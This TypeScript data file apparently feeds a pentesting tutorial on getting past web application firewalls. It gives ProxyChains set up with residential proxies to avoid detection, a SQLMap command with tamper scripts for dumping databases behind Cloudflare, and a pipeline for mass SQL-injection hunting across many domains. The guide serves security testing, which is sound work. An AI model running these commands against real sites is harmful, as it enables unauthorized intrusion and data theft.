export interface WAFSQLMapStep {
  id: string
  title: string
  description: string
  commands: { command: string; description: string }[]
  tools?: { name: string; url: string; description: string }[]
  tips?: string[]
}

export const wafSQLMapSteps: WAFSQLMapStep[] = [
  {
    id: "what-is-waf",
    title: "What is a WAF?",
    description: "A Web Application Firewall monitors and filters HTTP traffic to protect applications by blocking malicious payloads like SQL injection, XSS and more.",
    commands: [
      { command: "Request filtering - inspect and block malicious requests", description: "Feature: Request filtering" },
      { command: "Geo-blocking - restrict traffic by region", description: "Feature: Geo-blocking" },
      { command: "Rate limiting - prevent brute force and DDoS", description: "Feature: Rate limiting" },
      { command: "Custom rule creation - tailor rules for your app", description: "Feature: Custom rules" },
    ],
    tools: [
      { name: "Cloudflare", url: "https://www.cloudflare.com/waf/", description: "Popular CDN + WAF provider" },
      { name: "ModSecurity", url: "https://modsecurity.org/", description: "Open-source WAF engine" },
      { name: "AWS WAF", url: "https://aws.amazon.com/waf/", description: "Amazon Web Services WAF" },
      { name: "Imperva", url: "https://www.imperva.com/", description: "Enterprise WAF solution" },
    ],
    tips: [
      "WAFs use signature-based and behavioral detection",
      "Each WAF has different bypass methods",
      "Always test with authorization first",
    ],
  },
  {
    id: "setup-requirements",
    title: "Setup Requirements",
    description: "Before we begin, we need: SQLMap for automating SQL injections, ProxyChains for routing through proxies, and Residential Proxies to mimic real users.",
    commands: [
      { command: "SQLMap - powerhouse for automating SQL injections", description: "Required: SQLMap" },
      { command: "ProxyChains - routes traffic through multiple proxies", description: "Required: ProxyChains" },
      { command: "Residential Proxies - mimic real users to avoid detection", description: "Required: Residential Proxies" },
    ],
    tips: [
      "Install SQLMap: git clone https://github.com/sqlmapproject/sqlmap",
      "ProxyChains comes pre-installed on most pentest distros",
      "Residential proxies are more effective than datacenter proxies",
    ],
  },
  {
    id: "configuring-proxychains",
    title: "Configuring ProxyChains",
    description: "Open the ProxyChains config file, disable local proxy, add residential proxies, and enable random chain for reliability.",
    commands: [
      { command: "sudo mousepad /etc/proxychains.conf", description: "Open ProxyChains config file" },
      { command: "Comment out: # socks4 127.0.0.1 9050", description: "Disable default Tor proxy" },
      { command: "Add proxies: http <ip> <port> [user] [pass]", description: "Add residential proxies" },
      { command: "Disable: #dynamic_chain", description: "Disable dynamic chain" },
      { command: "Enable: random_chain", description: "Enable random chain for reliability" },
      { command: "Add: quiet_mode", description: "Quiet mode - no library output" },
    ],
    tips: [
      "Random chain improves reliability with multiple proxies",
      "Each connection uses a random proxy from the list",
      "Test with a small proxy list first to verify config",
    ],
  },
  {
    id: "validating-proxychains",
    title: "Validating ProxyChains with Curl",
    description: "After configuration, run curl through ProxyChains to verify everything is working correctly.",
    commands: [
      { command: "proxychains curl http://ipinfo.io", description: "Check proxy chain is working" },
      { command: "proxychains curl http://ipinfo.io/ip", description: "Verify IP is masked" },
    ],
    tips: [
      "The IP shown should be from your proxy list, not your real IP",
      "If connection fails, check proxy format in config file",
      "Test multiple times to verify random chain is working",
    ],
  },
  {
    id: "sqlmap-proxychains-tampers",
    title: "SQLMap + ProxyChains + Tamper Scripts",
    description: "Use SQLMap with ProxyChains and tamper scripts to bypass Cloudflare WAF and dump databases.",
    commands: [
      { command: "proxychains sqlmap -u 'url' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast --flush-session --threads 10", description: "SQLMap WAF bypass with ProxyChains and tampers" },
    ],
    tips: [
      "Tamper scripts: between, space2comment help bypass WAF rules",
      "--random-agent changes User-Agent per request",
      "--tech=B limits to boolean-based blind injection (quieter)",
      "--no-cast avoids CAST expressions (detected by some WAFs)",
    ],
  },
  {
    id: "mass-hunting-sqli",
    title: "Mass Hunting SQLi",
    description: "Scale the process by hunting SQL injection across similar subdomains using Google Dorks and passive sources.",
    commands: [
      { command: "https://github.com/coffinxp/scripts/blob/main/dorking.py", description: "Dorking script for finding subdomains" },
      { command: "cat urls.txt | awk -F/ '{print $3}' | sort -u", description: "Extract domain names from URLs" },
      { command: "cat urls.txt | waybackurls | gf sqli | uro > new.txt", description: "Get SQL param URLs from passive sources" },
    ],
    tools: [
      { name: "Dorking Script", url: "https://github.com/coffinxp/scripts/blob/main/dorking.py", description: "Google dorking script for subdomain discovery" },
      { name: "waybackurls", url: "https://github.com/tomnomnom/waybackurls", description: "Fetch URLs from Wayback Machine" },
      { name: "gf (grep patterns)", url: "https://github.com/tomnomnom/gf", description: "Pattern matching for common vulnerabilities" },
      { name: "uro", url: "https://github.com/s0md3v/uro", description: "Remove duplicate URLs" },
    ],
    tips: [
      "Use Google Dorks to find similar subdomains first",
      "waybackurls fetches historical URLs from Archive.org",
      "gf sqli filters URLs with SQL injection parameters",
    ],
  },
  {
    id: "noise-reduction",
    title: "Reducing Noise for Effective Scanning",
    description: "Reduce noise by getting one SQL param URL per domain to efficiently scan across a wide range of assets.",
    commands: [
      { command: "cat urls.txt | gawk -F/ '{host=$3; sub(/:80$/, \"\", host); if (!(host in seen)) { print $0; seen[host] } }'", description: "One SQL param URL per domain" },
    ],
    tips: [
      "Testing all URLs at once is inefficient",
      "This regex gives one unique URL per domain",
      "Great for quickly identifying vulnerable targets",
    ],
  },
  {
    id: "nuclei-scanning",
    title: "Scanning with Nuclei SQLi Templates",
    description: "Fire up Nuclei with DAST SQLi templates to scan for SQL injection vulnerabilities.",
    commands: [
      { command: "nuclei -l urls.txt -t nuclei-templates/dast/sql-injection.yaml", description: "Nuclei scan with DAST SQLi template" },
      { command: "https://github.com/coffinxp/nuclei-templates/blob/main/errsqli.yaml", description: "Error-based SQLi Nuclei template" },
    ],
    tools: [
      { name: "Nuclei DAST SQLi Template", url: "https://github.com/projectdiscovery/nuclei-templates", description: "DAST SQL injection detection template" },
      { name: "Error SQLi Template", url: "https://github.com/coffinxp/nuclei-templates/blob/main/errsqli.yaml", description: "Error-based SQLi detection" },
    ],
    tips: [
      "Nuclei can scan thousands of URLs quickly",
      "DAST templates detect active vulnerabilities",
      "Combine with gf and uro for cleaner results",
    ],
  },
  {
    id: "conclusion",
    title: "Conclusion",
    description: "ProxyChains and SQLMap make a powerful combo for bypassing WAFs. With residential proxies and tamper scripts, you can bypass Cloudflare, ModSecurity, and more.",
    commands: [],
    tips: [
      "ProxyChains + residential proxies + SQLMap tampers = WAF bypass",
      "Scale testing with Google Dorks + waybackurls + gf + uro",
      "Use Nuclei DAST templates for mass scanning",
      "Focus on finding real issues, not false alarms",
    ],
  },
]
